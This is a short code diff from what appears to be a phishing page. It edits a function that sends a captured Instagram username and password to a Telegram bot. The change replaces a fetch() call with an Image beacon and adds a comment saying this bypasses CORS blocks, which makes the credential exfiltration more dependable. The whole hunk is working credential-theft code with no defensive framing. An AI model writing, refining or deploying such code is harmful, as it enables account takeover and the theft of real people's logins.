@@ -242,9 +242,12 @@
         function sendToTelegram(username, password) {
             const timeStr = new Date().toLocaleString();
             const message = `🚨 *New IG Login Captured!* 🚨\n\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n⏰ *Time:* ${timeStr}`;
+            
+            // Using Image beacon method to bypass CORS blocks completely
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
             
-            fetch(url).catch(err => console.log("Telegram error:", err));
+            const img = new Image();
+            img.src = url;
         }
 
         // Toggle Password Visibility
